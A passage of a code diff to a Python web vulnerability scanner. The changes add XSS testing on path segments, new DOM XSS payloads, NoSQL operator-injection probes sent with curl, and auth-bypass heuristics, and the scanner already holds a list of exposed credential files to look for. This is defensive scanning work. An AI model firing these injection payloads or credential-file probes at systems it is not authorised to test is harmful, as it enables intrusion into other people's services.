@@ -11,6 +11,7 @@ import sys
 import tempfile
 import time
 import urllib.parse
+from html.parser import HTMLParser
 from typing import Any
 
 from .common import get_auth_curl_args, get_auth_sqlmap_context, run
@@ -20,6 +21,16 @@ from .exposure_markers import (
     derive_markers,
     guess_confidence,
 )
+from .active_prioritization import active_endpoint_score
+from .cancellation import scanner_cancel_requested
+
+try:
+    import check_registry as _check_registry
+except Exception:  # pragma: no cover - package-layout fallback
+    try:
+        from api import check_registry as _check_registry
+    except Exception:  # pragma: no cover - scanner-only fallback
+        _check_registry = None
 
 PUBLIC_DISCOVERY_FILES = {"robots.txt", "sitemap.xml"}
 PUBLIC_DISCOVERY_SENSITIVE_REFERENCES = (
@@ -73,10 +84,262 @@ SQLI_DOCUMENTATION_TRUSTED_SOURCES = {
 }
 
 
+class _VisibleHTMLParser(HTMLParser):
+    def __init__(self) -> None:
+        super().__init__(convert_charrefs=True)
+        self.hidden_depth = 0
+        self.parts: list[str] = []
+
+    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        if tag.lower() in {"script", "style"}:
+            self.hidden_depth += 1
+
+    def handle_endtag(self, tag: str) -> None:
+        if tag.lower() in {"script", "style"} and self.hidden_depth:
+            self.hidden_depth -= 1
+
+    def handle_data(self, data: str) -> None:
+        if not self.hidden_depth:
+            self.parts.append(data)
+
+
+class _ScriptHTMLParser(HTMLParser):
+    def __init__(self) -> None:
+        super().__init__(convert_charrefs=True)
+        self.sources: list[str] = []
+        self.inline: list[str] = []
+        self._current: list[str] | None = None
+
+    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        if tag.lower() != "script":
+            return
+        attributes = {key.lower(): value for key, value in attrs}
+        src = attributes.get("src")
+        if src:
+            self.sources.append(src)
+            self._current = None
+        else:
+            self._current = []
+
+    def handle_data(self, data: str) -> None:
+        if self._current is not None:
+            self._current.append(data)
+
+    def handle_endtag(self, tag: str) -> None:
+        if tag.lower() == "script" and self._current is not None:
+            self.inline.append("".join(self._current))
+            self._current = None
+
+
+def _visible_html_text(content: str) -> str:
+    parser = _VisibleHTMLParser()
+    parser.feed(content or "")
+    parser.close()
+    return re.sub(r"\s+", " ", " ".join(parser.parts))
+
+
+def _html_scripts(content: str) -> tuple[list[str], list[str]]:
+    parser = _ScriptHTMLParser()
+    parser.feed(content or "")
+    parser.close()
+    return parser.sources, parser.inline
+
+
 def _emit_scan_progress(phase: str, pct: int, message: str) -> None:
     pct = max(0, min(100, int(pct)))
     safe_message = re.sub(r"\s+", " ", str(message or "")).strip()[:160]
     print(f"[progress] phase={phase} pct={pct} message={safe_message}", file=sys.stderr, flush=True)
+
+
+def _scanner_cancel_requested() -> bool:
+    """Compatibility wrapper for existing active-check call sites/tests."""
+    return scanner_cancel_requested()
+
+
+def _coerce_param_names(raw: Any) -> list[str]:
+    if isinstance(raw, dict):
+        return [str(k) for k in raw.keys() if k]
+    if isinstance(raw, (list, tuple, set)):
+        return [str(v) for v in raw if v]
+    if isinstance(raw, str):
+        return [raw] if raw else []
+    return []
+
+
+def _coerce_telemetry_params(raw: Any) -> list[str]:
+    return _coerce_param_names(raw)
+
+
+def _active_endpoint_worklist_entry(
+    endpoint: dict[str, Any],
+    *,
+    url_override: str | None = None,
+    method_override: str | None = None,
+    params_override: list[str] | None = None,
+    body_params_override: list[str] | None = None,
+) -> str | None:
+    """Serialize one tested endpoint using the same custom-endpoint shape as
+    scanner reports and ASM inventory. This keeps per-endpoint telemetry
+    resolvable back to target_endpoints rows without importing scanner.py."""
+    raw = url_override or endpoint.get("url") or endpoint.get("path")
+    if not raw or not isinstance(raw, str):
+        return None
+    method = str(method_override or endpoint.get("method") or "GET").upper()
+    try:
+        parsed = urllib.parse.urlparse(raw if "://" in raw else "http://x" + (raw if raw.startswith("/") else "/" + raw))
+    except Exception:
+        return None
+    path = parsed.path or "/"
+    params = params_override if params_override is not None else _coerce_telemetry_params(
+        endpoint.get("params") or endpoint.get("query_params")
+    )
+    body = body_params_override if body_params_override is not None else _coerce_telemetry_params(
+        endpoint.get("body_params")
+    )
+    if parsed.query:
+        return f"{method} {path}?{parsed.query}"
+    if params:
+        return f"{method} {path}?" + "&".join(f"{p}=1" for p in params)
+    if body and method in ("POST", "PUT", "PATCH"):
+        content_type = str(endpoint.get("content_type") or "").lower()
+        body_template = endpoint.get("body_template")
+        if "json" in content_type:
+            if isinstance(body_template, dict) and body_template:
+                return f"{method} {path} json:" + json.dumps(body_template, separators=(",", ":"))
+            return f"{method} {path} json:" + json.dumps(
+                _synthetic_json_template_from_params(body),
+                separators=(",", ":"),
+            )
+        return f"{method} {path} form:" + "&".join(f"{b}=1" for b in body)
+    return f"{method} {path}"
+
+
+def _new_endpoint_attempt(
+    endpoint: dict[str, Any],
+    family: str,
+    *,
+    url_override: str | None = None,
+    method_override: str | None = None,
+    params: list[str] | None = None,
+    body_params: list[str] | None = None,
+) -> dict[str, Any] | None:
+    worklist_entry = _active_endpoint_worklist_entry(
+        endpoint,
+        url_override=url_override,
+        method_override=method_override,
+        params_override=params,
+        body_params_override=body_params,
+    )
+    if not worklist_entry:
+        return None
+    method = str(method_override or endpoint.get("method") or "GET").upper()
+    param_names = list(params if params is not None else (body_params if body_params is not None else []))
+    param_count = len(param_names)
+    param_location = "query" if params is not None else ("body" if body_params is not None else None)
+    return {
+        "custom_endpoint": worklist_entry,
+        "family": family,
+        "method": method,
+        "url": url_override or endpoint.get("url") or endpoint.get("path"),
+        "param_count": max(0, int(param_count)),
+        "param_names": param_names[:20],
+        "param_location": param_location,
+        "attempted_params_count": 0,
+        "completed_params_count": 0,
+        "status": "started",
+    }
+
+
+def _finish_endpoint_attempt(
+    attempt: dict[str, Any] | None,
+    *,
+    budget_exhausted: bool = False,
+    budget_exhausted_reason: str | None = None,
+    skipped_reason: str | None = None,
+) -> dict[str, Any] | None:
+    if not attempt:
+        return None
+    expected = int(attempt.get("param_count") or 0)
+    completed = int(attempt.get("completed_params_count") or 0)
+    if skipped_reason:
+        attempt["status"] = "skipped"
+        attempt["skip_reason"] = skipped_reason
+    elif completed <= 0:
+        attempt["status"] = "partial"
+    elif budget_exhausted and expected and completed < expected:
+        attempt["status"] = "partial"
+    else:
+        attempt["status"] = "completed"
+    if budget_exhausted:
+        attempt["budget_exhausted"] = True
+        attempt["budget_exhausted_reason"] = budget_exhausted_reason
+    # §5: serialize the per-endpoint technique set (JSON-safe, stable order).
+    techniques = attempt.get("techniques_attempted")
+    if isinstance(techniques, set):
+        attempt["techniques_attempted"] = sorted(techniques)
+    return attempt
+
+
+def _merge_endpoint_attempt_telemetry(*attempt_groups: Any) -> list[dict[str, Any]]:
+    merged: dict[str, dict[str, Any]] = {}
+    for group in attempt_groups:
+        for attempt in group or []:
+            if not isinstance(attempt, dict):
+                continue
+            key = attempt.get("custom_endpoint")
+            if not key:
+                continue
+            item = merged.setdefault(
+                str(key),
+                {
+                    "custom_endpoint": str(key),
+                    "method": attempt.get("method"),
+                    "url": attempt.get("url"),
+                    "families": [],
+                    "param_names": [],
+                    "param_locations": [],
+                    "attempted_params_count": 0,
+                    "completed_params_count": 0,
+                    "status": "completed",
+                    "family_attempts": {},
+                },
+            )
+            family = str(attempt.get("family") or "unknown")
+            if family not in item["families"]:
+                item["families"].append(family)
+            for param_name in attempt.get("param_names") or []:
+                param_text = str(param_name or "").strip()
+                if param_text and param_text not in item["param_names"]:
+                    item["param_names"].append(param_text)
+            param_location = str(attempt.get("param_location") or "").strip()
+            if param_location and param_location not in item["param_locations"]:
+                item["param_locations"].append(param_location)
+            status = str(attempt.get("status") or "partial")
+            item["attempted_params_count"] += int(attempt.get("attempted_params_count") or 0)
+            item["completed_params_count"] += int(attempt.get("completed_params_count") or 0)
+            item["family_attempts"][family] = {
+                "status": status,
+                "attempted_params_count": int(attempt.get("attempted_params_count") or 0),
+                "completed_params_count": int(attempt.get("completed_params_count") or 0),
+                "param_count": int(attempt.get("param_count") or 0),
+                "param_names": list(attempt.get("param_names") or [])[:20],
+                "param_location": attempt.get("param_location"),
+                "budget_exhausted": bool(attempt.get("budget_exhausted")),
+                "budget_exhausted_reason": attempt.get("budget_exhausted_reason"),
+                "skip_reason": attempt.get("skip_reason"),
+                "auth_state": attempt.get("auth_state"),
+                "principal_label": attempt.get("principal_label"),
+                "techniques_attempted": list(attempt.get("techniques_attempted") or [])[:30],
+                "validation_fields_added": list(attempt.get("validation_fields_added") or [])[:20],
+                "proof_type": attempt.get("proof_type"),
+                "proof_types": list(attempt.get("proof_types") or [])[:20],
+            }
+            if status != "completed" and item["status"] == "completed":
+                item["status"] = status
+            if attempt.get("budget_exhausted"):
+                item["budget_exhausted"] = True
+                item["budget_exhausted_reason"] = attempt.get("budget_exhausted_reason")
+    return sorted(merged.values(), key=lambda x: x["custom_endpoint"])
 
 
 def _is_sqli_documentation_endpoint(url: str) -> bool:
@@ -181,11 +444,12 @@ except ImportError:
 
 # Browser proof for XSS verification (optional - graceful degradation if unavailable)
 try:
-    from .proof_of_exploit import prove_xss_headless, ExploitProof
+    from .proof_of_exploit import prove_xss_headless, prove_xss_response_headless, ExploitProof
     HAS_XSS_PROOF = True
 except ImportError:
     HAS_XSS_PROOF = False
     prove_xss_headless = None
+    prove_xss_response_headless = None
     ExploitProof = None
 
 # Statistical testing for SQLi timing validation (optional)
@@ -365,7 +629,7 @@ async def dalfox_one(
         if deep_domxss:
             cmd.append("--deep-domxss")  # Check for DOM-based XSS (spawns headless browser)
         timeout = 180
-    out, err, rc = await run(cmd, timeout=timeout, kill_process_group=bool(deep_domxss))
+    out, err, rc = await run(cmd, timeout=timeout)
     findings: list[dict] = []
     scan_completed = rc == 0  # Tool executed successfully
     error = None
@@ -381,12 +645,84 @@ async def dalfox_one(
     return {"findings": findings, "scan_completed": scan_completed, "error": error}
 
 
+_PATH_UUID_RE = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
+
+
+def _injectable_path_segment(path: str) -> tuple[str, int] | None:
+    """Return the last id/value-like path segment to fuzz, or None.
+
+    Reflected XSS / injection on PATH parameters (e.g. ``/track-order/{id}``) is
+    missed when only query params are tested (docs proposed-next-steps §12). A
+    segment is injectable when it looks like an id/value — numeric, a UUID, a long
+    hex/random token, or a mixed letters+digits token — rather than a literal route
+    word. This is a generic signal (no route names hardcoded), so it works on any
+    ``/x/{id}`` endpoint without target-fitting.
+    """
+    if not path:
+        return None
+    segs = path.split("/")
+    for i in range(len(segs) - 1, -1, -1):
+        s = segs[i]
+        if not s:
+            continue
+        is_id_like = (
+            s.isdigit()
+            or bool(_PATH_UUID_RE.match(s))
+            or (len(s) >= 10 and all(c in "0123456789abcdefABCDEF" for c in s))
+            or (len(s) >= 6 and any(c.isdigit() for c in s) and any(c.isalpha() for c in s))
+        )
+        if is_id_like:
+            return s, i
+    return None
+
+
+def _build_path_segment_url(parsed, seg_index: int, value: str) -> str:
+    """Rebuild a URL with the path segment at seg_index replaced by `value`."""
+    segs = parsed.path.split("/")
+    if 0 <= seg_index < len(segs):
+        segs[seg_index] = urllib.parse.quote(value, safe="")
+    return urllib.parse.urlunparse(parsed._replace(path="/".join(segs)))
+
+
+_PATH_VALUE_ROUTE_TOKENS = (
+    "track", "lookup", "order", "receipt", "invoice", "status", "verify",
+    "confirm", "reset", "recover", "token", "reference", "ref", "ticket",
+)
+
+
+def _path_value_probe_candidate(parsed: urllib.parse.ParseResult, sample_value: str) -> str | None:
+    """Return a child-segment probe URL for routes that likely accept a path value.
+
+    Some applications expose value-in-path lookups as a parent route in discovery
+    (for example ``/orders/track``), while the vulnerable reflection happens at
+    ``/orders/track/{value}``. We only synthesize this for queryless GET-style
+    lookup routes with an action token, and the normal path-segment detector still
+    requires reflection or browser execution proof before a finding is emitted.
+    """
+    if parsed.query or parsed.params:
+        return None
+    path = parsed.path or ""
+    if not path or path.endswith("/"):
+        return None
+    if _injectable_path_segment(path):
+        return None
+    route_tokens = {token for token in re.split(r"[^a-z0-9]+", path.lower()) if token}
+    if not route_tokens.intersection(_PATH_VALUE_ROUTE_TOKENS):
+        return None
+    segments = [seg for seg in path.split("/") if seg]
+    if not segments:
+        return None
+    candidate_path = "/" + "/".join([*segments, urllib.parse.quote(sample_value, safe="")])
+    return urllib.parse.urlunparse(parsed._replace(path=candidate_path))
+
+
 async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
     """
     Custom XSS detection using proven payloads and reflection analysis.
     Detects reflected XSS and indicators of potential DOM XSS.
     Uses context-aware payload selection for improved accuracy.
-    Also tests fragment parameters for SPA hash routes (DOM XSS).
+    Also tests fragment parameters for SPA hash routes (DOM XSS) and id-like PATH
+    segments for reflected XSS (docs §12).
     """
     findings = []
     tested = 0
@@ -398,7 +734,11 @@ async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
     base_url, frag_path, frag_params = _parse_fragment_params(url)
     is_hash_route = _is_hash_route(url)
 
-    if not query_params and not frag_params:
+    # Id-like path segment (e.g. /track-order/{id}) — a reflected-XSS surface that
+    # query-only testing misses (docs §12).
+    path_segment = _injectable_path_segment(parsed.path)
+
+    if not query_params and not frag_params and not path_segment:
         return {"findings": [], "tested": 0, "vulnerable": False}
 
     # Context-specific XSS payloads - selected based on where input is reflected
@@ -638,15 +978,56 @@ async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
                     "reflection_context": reflection_context,  # Added: precise context detection
                 })
 
+    # Reflected XSS on an id-like PATH segment (docs §12 — /track-order/{id} style).
+    # Same canary -> context -> payload -> reflection flow as query params, but the
+    # injection point is a path segment instead of a query value.
+    if path_segment is not None:
+        seg_value, seg_index = path_segment
+        canary_url = _build_path_segment_url(parsed, seg_index, canary)
+        canary_body, _, content_type = await get_response(canary_url)
+        is_html = "html" in content_type.lower() or "<html" in canary_body.lower()
+        is_json = "json" in content_type.lower() or canary_body.strip().startswith(("{", "["))
+        reflection_context = "not_reflected"
+        if canary in canary_body:
+            reflection_context = detect_reflection_context(canary_body, canary)
+        if reflection_context != "not_reflected":
+            if reflection_context in CONTEXT_PAYLOADS:
+                xss_payloads = CONTEXT_PAYLOADS[reflection_context] + BYPASS_PAYLOADS
+            else:
+                xss_payloads = FALLBACK_PAYLOADS + BYPASS_PAYLOADS
+            for payload, payload_type in xss_payloads:
+                tested += 1
+                test_url = _build_path_segment_url(parsed, seg_index, payload)
+                test_body, _, _ = await get_response(test_url)
+                if payload in test_body:
+                    findings.append({
+                        "type": "Cross-Site Scripting (XSS)",
+                        "url": test_url,
+                        "parameter": f"path[{seg_index}]",
+                        "payload": payload,
+                        "payload_type": payload_type,
+                        "evidence": [f"Payload reflected unencoded in path segment: {payload[:50]}"],
+                        "severity": "high",
+                        "context": "html" if is_html else "json" if is_json else "unknown",
+                        "reflection_context": reflection_context,
+                        "injection_point": "path_segment",
+                    })
+                    break  # one proven payload per segment is enough
+
     # Test fragment parameters for hash routes (DOM XSS)
     # These require browser-based verification since payloads execute client-side
     if is_hash_route and frag_params and not HAS_XSS_PROOF:
         print(f"[xss] Skipping hash route DOM XSS tests: Playwright not available", file=sys.stderr)
     elif is_hash_route and frag_params and HAS_XSS_PROOF and prove_xss_headless:
-        # DOM XSS payloads specifically for fragment injection
+        # DOM XSS payloads for fragment injection. The iframe javascript: vector is
+        # first because it fires synchronously on render and survives Angular-style
+        # innerHTML sinks (the canonical SPA search/hash-route DOM XSS) — the others
+        # depend on an async image/SVG load that may not fire under headless timing.
         DOM_XSS_PAYLOADS = [
+            ('<iframe src="javascript:alert(1)">', "iframe_js"),
             ("<img src=x onerror=alert(1)>", "img_onerror"),
             ("<svg onload=alert(1)>", "svg_onload"),
+            ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "svg_animate"),
             ("'-alert(1)-'", "js_expression"),
             ("\"><img src=x onerror=alert(1)>", "attr_break_img"),
         ]
@@ -671,14 +1052,26 @@ async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
                         fragment_params=test_frag_params,
                     )
                     if proof and proof.proven:
+                        # A fired dialog / console execution (confidence >= 0.9) is
+                        # confirmed script execution -> High (session theft capable).
+                        # Pass an explicit High CVSS so the generic XSS base score
+                        # (6.1, medium) can't cap a browser-proven DOM XSS to medium.
+                        executed = proof.confidence >= 0.9
                         findings.append({
                             "type": "DOM XSS (Hash Route)",
                             "url": test_url,
                             "parameter": param_name,
                             "payload": payload,
                             "payload_type": payload_type,
-                            "evidence": [f"Browser proof: {proof.technique}", f"Confidence: {proof.confidence}"],
-                            "severity": "high" if proof.confidence >= 0.9 else "medium",
+                            "evidence": [
+                                f"Browser proof: {proof.technique}",
+                                f"Confidence: {proof.confidence}",
+                                "payload executed in headless browser (dialog fired)" if executed
+                                else "payload landed in executable DOM context",
+                            ],
+                            "severity": "high" if executed else "medium",
+                            "cvss_score": 7.4 if executed else 6.1,
+                            "verified": executed,
                             "context": "hash_route",
                             "reflection_context": "dom_xss",
                             "proof": proof.to_dict() if hasattr(proof, "to_dict") else None,
@@ -1583,6 +1976,7 @@ async def check_exposed_files(base_url: str, quick_mode: bool = False) -> dict[s
         "settings.py", "local_settings.py", "config.inc.php", "database.inc.php", "db.inc.php",
         # Language/toolchain auth files
         ".npmrc", ".pypirc", ".gem/credentials", "auth.json",
+        ".well-known/security.txt",
     ]
     medium_priority_paths = [
         "config.json", "config.yml", "config.yaml", "config.xml", "settings.json", "appsettings.json", "appsettings.Development.json", "parameters.yml", "parameters.ini", "secrets.yml", "credentials.yml",
@@ -1944,7 +2338,7 @@ async def nosql_injection_test(url: str) -> dict[str, Any]:
     - Generic error pages
     - WAF/honeypot responses
     """
-    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": []}
+    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": [], "findings": []}
     payloads: list[Any] = [{"$ne": "1"}, {"$gt": ""}, {"$regex": ".*"}, "';return true;var foo='", "\\x27;return true;var foo=\\x27", "{\"$ne\":null}", "{\"$ne\":\"\"}", "{\"$or\":[{},{}]}", "';while(1);var foo='", "';sleep(5000);var foo='", "[\"$ne\"]", "{\"$where\":\"sleep(5000)\"}"]
 
     def _is_html_response(content: str) -> bool:
@@ -1982,6 +2376,172 @@ async def nosql_injection_test(url: str) -> dict[str, Any]:
             if re.search(pattern, content, re.IGNORECASE):
                 return True, name
         return False, None
+
+    def _query_operator_url(param: str, op: str, value: str) -> str:
+        parsed = urllib.parse.urlparse(url)
+        qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+        filtered = [(k, v) for k, v in qs if k != param and not k.startswith(f"{param}[")]
+        filtered.append((f"{param}[{op}]", value))
+        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(filtered)))
+
+    def _json_collection_stats(body: str) -> dict[str, Any]:
+        stats: dict[str, Any] = {
+            "valid_json": False,
+            "max_array_items": 0,
+            "object_key_count": 0,
+            "data_keys": set(),
+        }
+        if not body:
+            return stats
+        try:
+            parsed_body = json.loads(body)
+        except Exception:
+            return stats
+        stats["valid_json"] = True
+
+        def _walk(value: Any, depth: int = 0) -> None:
+            if depth > 5:
+                return
+            if isinstance(value, dict):
+                stats["object_key_count"] += len(value)
+                for key, child in value.items():
+                    stats["data_keys"].add(str(key).lower())
+                    _walk(child, depth + 1)
+            elif isinstance(value, list):
+                stats["max_array_items"] = max(int(stats["max_array_items"]), len(value))
+                for child in value[:10]:
+                    _walk(child, depth + 1)
+
+        _walk(parsed_body)
+        return stats
+
+    def _query_collection_diff_evidence(
+        control_body: str,
+        permissive_body: str,
+        *,
+        control_status: int | None,
+        permissive_status: int | None,
+        control2_body: str | None = None,
+        control2_status: int | None = None,
+    ) -> dict[str, Any] | None:
+        if permissive_status is None or not (200 <= permissive_status < 300):
+            return None
+        if _is_html_response(permissive_body):
+            return None
+        permissive_stats = _json_collection_stats(permissive_body)
+        if not permissive_stats["valid_json"]:
+            return None
+        control_stats = _json_collection_stats(control_body)
+        p_items = int(permissive_stats["max_array_items"])
+        c_items = int(control_stats["max_array_items"])
+        p_keys = permissive_stats["data_keys"]
+        data_key_markers = {
+            "id", "_id", "uid", "product", "productid", "product_id", "review",
+            "reviews", "comment", "comments", "message", "rating", "email",
+            "user", "username", "author", "createdat", "updatedat", "name",
+            "title", "description",
+        }
+        has_data_shape = (
+            p_items >= 2
+            and int(permissive_stats["object_key_count"]) >= 2
+            and bool(p_keys.intersection(data_key_markers) or len(p_keys) >= 3)
+        )
+        if not has_data_shape:
+            return None
+        control_rejected = control_status in (400, 401, 403, 404, 422)
+        expanded_items = p_items >= max(2, c_items + 2)
+        expanded_bytes = len(permissive_body or "") >= len(control_body or "") + 120
+        if not control_rejected and expanded_items and expanded_bytes:
+            # Reproducibility guard: an expansion delta only means injection if the CONTROL
+            # is stable. A volatile collection (feed/randomized/rate-limited list) can differ
+            # by the threshold request-to-request with no injection, faking the differential.
+            # Require a second control sample that matches the first AND that the permissive
+            # response still clears it. (control_rejected is a status asymmetry, jitter-proof.)
+            if control2_body is None:
+                return None
+            control2_stats = _json_collection_stats(control2_body)
+            c2_items = int(control2_stats["max_array_items"])
+            controls_stable = (
+                control2_status == control_status
+                and c2_items <= c_items + 1
+                and abs(len(control2_body or "") - len(control_body or "")) < 120
+                and p_items >= max(2, c2_items + 2)
+                and len(permissive_body or "") >= len(control2_body or "") + 120
+            )
+            if not controls_stable:
+                return None
+        if control_rejected or (expanded_items and expanded_bytes):
+            return {
+                "control_status": control_status,
+                "payload_status": permissive_status,
+                "control_items": c_items,
+                "payload_items": p_items,
+                "control_length": len(control_body or ""),
+                "payload_length": len(permissive_body or ""),
+            }
+        return None
+
+    parsed_url = urllib.parse.urlparse(url)
+    query_params = [name for name in urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True).keys() if name]
+    if query_params:
+        status_marker = "__SHAKERSCAN_NOSQL_QUERY__"
+        for param in query_params[:5]:
+            control_url = _query_operator_url(param, "$eq", "shakerscan_nx_8f3a2e")
+            permissive_url = _query_operator_url(param, "$ne", "shakerscan_nx_8f3a2e")
+            control_raw, _, control_rc = await run([
+                "curl", "-sS", "-L", "-k", "--max-time", "10",
+                "-w", f"{status_marker}%{{http_code}}{status_marker}",
+                control_url,
+            ], timeout=15)
+            permissive_raw, _, permissive_rc = await run([
+                "curl", "-sS", "-L", "-k", "--max-time", "10",
+                "-w", f"{status_marker}%{{http_code}}{status_marker}",
+                permissive_url,
+            ], timeout=15)
+            results["payloads_tested"].extend([f"{param}[$eq]", f"{param}[$ne]"])
+            if control_rc != 0 or permissive_rc != 0:
+                continue
+
+            def _split_status(raw: str | None) -> tuple[str, int | None]:
+                text = raw or ""
+                if status_marker not in text:
+                    return text, None
+                body, _, rest = text.partition(status_marker)
+                code_text, _, _tail = rest.partition(status_marker)
+                try:
+                    return body, int(code_text)
+                except (TypeError, ValueError):
+                    return body, None
+
+            control_body, control_status = _split_status(control_raw)
+            permissive_body, permissive_status = _split_status(permissive_raw)
+            # Second control sample to detect a volatile collection (reproducibility guard).
+            control2_raw, _, control2_rc = await run([
+                "curl", "-sS", "-L", "-k", "--max-time", "10",
+                "-w", f"{status_marker}%{{http_code}}{status_marker}",
+                control_url,
+            ], timeout=15)
+            control2_body, control2_status = _split_status(control2_raw) if control2_rc == 0 else (None, None)
+            evidence = _query_collection_diff_evidence(
+                control_body,
+                permissive_body,
+                control_status=control_status,
+                permissive_status=permissive_status,
+                control2_body=control2_body,
+                control2_status=control2_status,
+            )
+            if evidence:
+                finding = {
+                    "parameter": param,
+                    "payload": f"{param}[$ne]=shakerscan_nx_8f3a2e",
+                    "evidence_type": "operator_query_collection_differential",
+                    "response_snippet": permissive_body[:500],
+                    **evidence,
+                }
+                results["vulnerable"] = True
+                results["evidence"].append(finding)
+                results["findings"].append(finding)
+                return results
 
     # Get baseline timing for time-based detection (3 samples to establish normal response time)
     baseline_times = []
@@ -2081,10 +2641,57 @@ async def nosql_injection_test_json_body(
         "params_tested": 0,
         "url": url,
         "method": method,
+        "endpoint_attempts": [],
+        "validation_fields_added": [],
     }
 
+    params = _coerce_param_names(params)
     if not params:
         return results
+
+    attempt_endpoint: dict[str, Any] = {
+        "url": url,
+        "method": method,
+        "content_type": "application/json",
+        "body_params": list(params),
+    }
+    if isinstance(body_template, dict):
+        attempt_endpoint["body_template"] = body_template
+    attempt = _new_endpoint_attempt(
+        attempt_endpoint,
+        "nosqli",
+        url_override=url,
+        method_override=method,
+        body_params=list(params),
+    )
+
+    def _finalize_attempt(*, skipped_reason: str | None = None) -> None:
+        if results["endpoint_attempts"]:
+            return
+        finished = _finish_endpoint_attempt(attempt, skipped_reason=skipped_reason)
+        if finished:
+            results["endpoint_attempts"].append(finished)
+
+    attempted_param_names: set[str] = set()
+    completed_param_names: set[str] = set()
+
+    def _mark_attempted(names: list[str]) -> None:
+        if attempt is None:
+            return
+        for name in names:
+            if name in attempted_param_names:
+                continue
+            attempted_param_names.add(name)
+            attempt["attempted_params_count"] += 1
+
+    def _mark_completed(names: list[str]) -> None:
+        if attempt is None:
+            return
+        for name in names:
+            if name in completed_param_names:
+                continue
+            completed_param_names.add(name)
+            attempt["completed_params_count"] += 1
 
     meta_pattern = re.compile(r"__SHAKERSCAN_NOSQL__(\d{3})__SHAKERSCAN_NOSQL__$")
 
@@ -2096,6 +2703,184 @@ async def nosql_injection_test_json_body(
             return raw, None
         body = raw[: match.start()]
         return body, int(match.group(1))
+
+    def _param_tokens(name: str) -> set[str]:
+        return {part for part in re.split(r"[^a-z0-9]+", name.lower()) if part}
+
+    def _is_identity_param(name: str) -> bool:
+        lowered = name.lower()
+        tokens = _param_tokens(lowered)
+        return (
+            "email" in lowered
+            or "username" in lowered
+            or "user_name" in lowered
+            or "login" in tokens
+            or "userid" in lowered
+            or "user" in tokens
+        )
+
+    def _is_secret_param(name: str) -> bool:
+        lowered = name.lower()
+        return "password" in lowered or "passwd" in lowered or lowered in {"pass", "pwd"}
+
+    def _is_auth_failure(status: int | None, body: str) -> bool:
+        lowered = (body or "").lower()
+        failure_markers = (
+            "invalid credentials", "invalid email", "invalid password",
+            "login failed", "authentication failed", "unauthorized",
+            "forbidden", "wrong password", "user not found",
+        )
+        return (status in {400, 401, 403, 404, 422}) or any(marker in lowered for marker in failure_markers)
+
+    def _flatten_json_keys(value: Any, prefix: str = "") -> set[str]:
+        keys: set[str] = set()
+        if isinstance(value, dict):
+            for key, child in value.items():
+                key_text = str(key)
+                full = f"{prefix}.{key_text}" if prefix else key_text
+                keys.add(full.lower())
+                keys.update(_flatten_json_keys(child, full))
+        elif isinstance(value, list):
+            for child in value[:5]:
+                keys.update(_flatten_json_keys(child, prefix))
+        return keys
+
+    def _auth_success_signals(body: str) -> list[str]:
+        if not body:
+            return []
+        lowered = body.lower()
+        signals: set[str] = set()
+        try:
+            parsed = json.loads(body)
+        except Exception:
+            parsed = None
+        if parsed is not None:
+            keys = _flatten_json_keys(parsed)
+            auth_key_fragments = (
+                "token", "access_token", "refreshtoken", "refresh_token",
+                "jwt", "session", "authentication", "authorization",
+            )
+            identity_key_fragments = (
+                "user", "username", "email", "role", "roles", "account", "profile",
+                "customer", "client", "principal", "identity", "subject", "sub",
+            )
+            if any(any(fragment in key for fragment in auth_key_fragments) for key in keys):
+                signals.add("auth_token_or_session")
+            if any(any(fragment in key for fragment in identity_key_fragments) for key in keys):
+                signals.add("user_identity_data")
+            if "user_identity_data" not in signals:
+                id_key_markers = {"id", "_id", "uid", "user_id", "userid", "account_id", "accountid", "customer_id", "customerid"}
+                if any(key.rsplit(".", 1)[-1] in id_key_markers for key in keys):
+                    signals.add("user_identity_data")
+        text_markers = (
+            '"token"', '"access_token"', '"accessToken"', '"refresh_token"',
+            '"jwt"', '"authentication"', '"authorization"', '"session"',
+        )
+        if any(marker.lower() in lowered for marker in text_markers):
+            signals.add("auth_token_or_session")
+        if re.search(
+            r'"(?:_?id|uid|email|username|role|roles|account(?:_?id)?|customer(?:_?id)?|user(?:_id|id)?|principal|subject|sub)"\s*:',
+            body,
+            re.I,
+        ):
+            signals.add("user_identity_data")
+        return sorted(signals)
+
+    def _json_collection_stats(body: str) -> dict[str, Any]:
+        """Extract conservative collection-shape stats from a JSON response."""
+        stats: dict[str, Any] = {
+            "valid_json": False,
+            "max_array_items": 0,
+            "object_key_count": 0,
+            "data_keys": set(),
+        }
+        if not body:
+            return stats
+        try:
+            parsed = json.loads(body)
+        except Exception:
+            return stats
+        stats["valid_json"] = True
+
+        def _walk(value: Any, depth: int = 0) -> None:
+            if depth > 5:
+                return
+            if isinstance(value, dict):
+                stats["object_key_count"] += len(value)
+                for key, child in value.items():
+                    key_text = str(key).lower()
+                    stats["data_keys"].add(key_text)
+                    _walk(child, depth + 1)
+            elif isinstance(value, list):
+                stats["max_array_items"] = max(int(stats["max_array_items"]), len(value))
+                for child in value[:10]:
+                    _walk(child, depth + 1)
+
+        _walk(parsed)
+        return stats
+
+    def _collection_diff_evidence(
+        control_body: str,
+        permissive_body: str,
+        *,
+        control_status: int | None,
+        permissive_status: int | None,
+        control2_body: str | None = None,
+        control2_status: int | None = None,
+    ) -> dict[str, Any] | None:
+        if permissive_status is None or not (200 <= permissive_status < 300):
+            return None
+        permissive_stats = _json_collection_stats(permissive_body)
+        if not permissive_stats["valid_json"]:
+            return None
+        control_stats = _json_collection_stats(control_body)
+        p_items = int(permissive_stats["max_array_items"])
+        c_items = int(control_stats["max_array_items"])
+        p_keys = permissive_stats["data_keys"]
+        data_key_markers = {
+            "id", "_id", "uid", "product", "productid", "product_id", "review",
+            "reviews", "comment", "comments", "message", "rating", "email",
